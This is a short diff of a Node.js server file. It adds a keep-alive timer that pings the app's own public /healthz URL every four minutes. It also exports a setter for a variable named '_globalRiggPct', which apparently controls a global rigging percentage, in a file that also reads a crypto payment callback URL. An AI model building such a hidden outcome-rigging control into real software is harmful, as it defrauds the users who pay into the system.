-      http.get('http://localhost:' + config.port + '/healthz', () => clearInterval(interval)).on('error', () => {});
-    } catch {}
-  }, 5 * 60 * 1000);
-}
+const https = (() => { try { return require('https'); } catch { return null; } })();
+const keepAliveInterval = () => {
+  const publicUrl = process.env.RENDER_EXTERNAL_URL || process.env.PUBLIC_URL || process.env.APIRONE_CALLBACK_URL;
+  const mod = publicUrl && publicUrl.startsWith('https') ? https : http;
+  const url = (publicUrl || 'http://localhost:' + config.port) + '/healthz';
+  mod.get(url, (res) => { res.resume(); }).on('error', () => {});
+};
+keepAliveInterval();
+setInterval(keepAliveInterval, 4 * 60 * 1000);
 
-module.exports = app;
+module.exports = { app, setGlobalRiggPct: (v) => { _globalRiggPct = v; } };
